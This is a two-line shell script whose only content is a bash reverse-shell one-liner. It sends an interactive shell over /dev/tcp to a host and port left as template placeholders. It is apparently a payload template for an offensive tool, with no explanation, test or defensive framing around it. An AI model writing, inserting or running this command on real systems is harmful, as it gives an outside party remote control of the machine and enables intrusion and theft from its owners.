#!/bin/sh
bash -i >&/dev/tcp/{ip}/{rev} 0>&1
